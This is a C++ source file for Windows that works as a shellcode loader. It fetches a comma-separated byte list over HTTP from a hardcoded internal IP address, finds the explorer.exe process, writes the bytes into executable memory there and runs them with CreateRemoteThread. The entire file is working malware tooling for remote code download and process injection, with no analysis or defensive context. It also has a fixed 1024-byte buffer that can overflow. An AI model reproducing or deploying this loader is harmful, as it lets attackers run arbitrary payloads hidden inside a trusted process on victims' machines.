#include <string>
#include <windows.h>
#include <winhttp.h>
#include<iostream>
#include <tlhelp32.h>
#pragma comment(lib, "winhttp.lib")

using namespace std;

char* WinGet(char* ip, int port, char* url)
{

	HINTERNET hSession = NULL;
	HINTERNET hConnect = NULL;
	HINTERNET hRequest = NULL;

	int ipSize;
	wchar_t* ip_wchar;

	ipSize = MultiByteToWideChar(CP_ACP, 0, ip, -1, NULL, 0);
	ip_wchar = (wchar_t*)malloc(ipSize * sizeof(wchar_t));
	MultiByteToWideChar(CP_ACP, 0, ip, -1, ip_wchar, ipSize);

	int urlSize;
	wchar_t* url_wchar;

	urlSize = MultiByteToWideChar(CP_ACP, 0, url, -1, NULL, 0);
	url_wchar = (wchar_t*)malloc(urlSize * sizeof(wchar_t));
	MultiByteToWideChar(CP_ACP, 0, url, -1, url_wchar, urlSize);




	hSession = WinHttpOpen(L"WinHTTP Example/1.0",
		WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
		WINHTTP_NO_PROXY_NAME,
		WINHTTP_NO_PROXY_BYPASS, 0);

	if (hSession == NULL) {
		cout << "Error:Open session failed: " << GetLastError() << endl;
		exit(0);
	}

	hConnect = WinHttpConnect(hSession, ip_wchar, port, 0);
	if (hConnect == NULL) {
		cout << "Error:Connect failed: " << GetLastError() << endl;
		exit(0);
	}


	hRequest = WinHttpOpenRequest(hConnect, L"GET", url_wchar, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
	if (hRequest == NULL) {
		cout << "Error:OpenRequest failed: " << GetLastError() << endl;
		exit(0);
	}

	BOOL bResults;
	bResults = WinHttpSendRequest(hRequest,
		WINHTTP_NO_ADDITIONAL_HEADERS,
		0, WINHTTP_NO_REQUEST_DATA, 0,
		0, 0);

	if (!bResults) {
		cout << "Error:SendRequest failed: " << GetLastError() << endl;
		exit(0);
	}
	else {
		bResults = WinHttpReceiveResponse(hRequest, NULL);
	}


	LPVOID lpHeaderBuffer = NULL;
	DWORD dwSize = 0;
	LPSTR pszOutBuffer = NULL;
	DWORD dwDownloaded = 0;        
	wchar_t* pwText = NULL;
	if (bResults)
	{
		do
		{
			dwSize = 0;
			if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) {
				cout << "Error：WinHttpQueryDataAvailable failed：" << GetLastError() << endl;
				break;
			}
			if (!dwSize)    break;              


			pszOutBuffer = new char[dwSize + 1];
			if (!pszOutBuffer) {
				cout << "Out of memory." << endl;
				break;
			}
			ZeroMemory(pszOutBuffer, dwSize + 1);   

			if (!WinHttpReadData(hRequest, pszOutBuffer, dwSize, &dwDownloaded)) {
				cout << "Error：WinHttpQueryDataAvailable failed：" << GetLastError() << endl;
			}
			if (!dwDownloaded)
				break;


		} while (dwSize > 0);

		DWORD dwNum = MultiByteToWideChar(CP_ACP, 0, pszOutBuffer, -1, NULL, 0);    
		pwText = new wchar_t[dwNum];                    
		MultiByteToWideChar(CP_UTF8, 0, pszOutBuffer, -1, pwText, dwNum); 

	}

	if (hRequest) WinHttpCloseHandle(hRequest);
	if (hConnect) WinHttpCloseHandle(hConnect);
	if (hSession) WinHttpCloseHandle(hSession);


	int iSize;
	char* data;


	iSize = WideCharToMultiByte(CP_ACP, 0, pwText, -1, NULL, 0, NULL, NULL);
	data = (char*)malloc(iSize * sizeof(char));
	WideCharToMultiByte(CP_ACP, 0, pwText, -1, data, iSize, NULL, NULL);
	return data;
}

int findMyProc() {

	HANDLE hSnapshot;
	PROCESSENTRY32 pe;
	int pid = 0;
	BOOL hResult;

	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (INVALID_HANDLE_VALUE == hSnapshot) return 0;

	pe.dwSize = sizeof(PROCESSENTRY32);

	hResult = Process32First(hSnapshot, &pe);

	while (hResult) {

		if (strcmp("explorer.exe", pe.szExeFile) == 0) {
			pid = pe.th32ProcessID;
			break;
		}
		hResult = Process32Next(hSnapshot, &pe);
	}

	CloseHandle(hSnapshot);

	return pid;
}

int main(int argc, char* argv[])
{

	HANDLE processHandle;
	HANDLE remoteThread;
	PVOID remoteBuffer;
	char* data;
	char ip[] = "192.168.233.231";
	char url[] = "test";

	data = WinGet(ip, 80, url);

	char buf[1024];
	const char s[] = ",";
	char* res = NULL;
	int i = 0;
	res = strtok(data, s);
	//cout << sizeof(buf) << endl;
	while (res != NULL) {
		//printf("\\x%x", stoi(res));

		buf[i] = char(stoi(res));
		//printf("%x", stoi(res));
		res = strtok(NULL, s);
		i++;
	}
	int pid = findMyProc();

	DWORD dw = static_cast<DWORD>(pid);
	processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dw);
	remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof(buf), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);

	WriteProcessMemory(processHandle, remoteBuffer, buf, sizeof(buf), NULL);

	remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);

	CloseHandle(processHandle);

	return 0;
}
